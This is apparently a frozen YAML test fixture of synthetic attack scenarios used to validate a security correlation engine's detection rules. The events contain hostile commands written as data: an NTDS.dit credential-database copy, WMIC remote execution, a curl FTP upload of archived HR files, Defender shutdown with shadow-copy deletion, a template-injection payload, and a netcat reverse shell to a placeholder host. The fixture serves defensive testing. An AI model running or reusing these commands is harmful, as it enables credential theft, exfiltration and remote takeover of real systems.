# FROZEN held-out campaigns v3. Written without consulting correlations.yaml. Do not edit (see validation/FROZEN.json).
scenarios:
- id: HC3-001
  name: NTDS theft followed by WMI remote execution (same service account)
  expect_correlation: TB-COR-004
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: dc-02
    process_name: esentutl.exe
    command_line: esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\Windows\Temp\n.dit
    username: svc-sql
  - at: 90
    title: Process creation
    event_type: process.start
    asset_name: dc-02
    process_name: wmic.exe
    command_line: wmic /node:10.0.4.12 process call create "cmd /c C:\Windows\Temp\p.exe"
    username: svc-sql
- id: HC3-002
  name: Archive then FTP upload on one workstation
  expect_correlation: TB-COR-005
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: ws-hr-09
    process_name: 7z.exe
    command_line: 7z.exe a -tzip -pX C:\Users\Public\hr.zip C:\Users\*\Documents\*.xlsx
  - at: 75
    title: Process creation
    event_type: process.start
    asset_name: ws-hr-09
    process_name: curl.exe
    command_line: curl.exe -T C:\Users\Public\hr.zip ftp://203.0.113.20/in/ --user u:p
- id: HC3-003
  name: Defender stopped then shadow copies deleted via WMI
  expect_correlation: TB-COR-006
  events:
  - at: 0
    title: Process creation
    event_type: process.start
    asset_name: srv-fs-03
    process_name: powershell.exe
    command_line: powershell Stop-Service -Name WinDefend -Force
  - at: 20
    title: Process creation
    event_type: process.start
    asset_name: srv-fs-03
    process_name: wmic.exe
    command_line: wmic shadowcopy delete /nointeractive
- id: HC3-004
  name: Template injection then netcat shell on the web host
  expect_correlation: TB-COR-003
  events:
  - at: 0
    title: HTTP request
    event_type: web.request
    source_ip: 198.51.100.150
    asset_name: web-09
    raw_data:
      url: /greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  - at: 6
    title: Process creation
    event_type: process.start
    asset_name: web-09
    process_name: nc.traditional
    command_line: nc.traditional -e /bin/bash 203.0.113.9 4444
- id: HC3-005
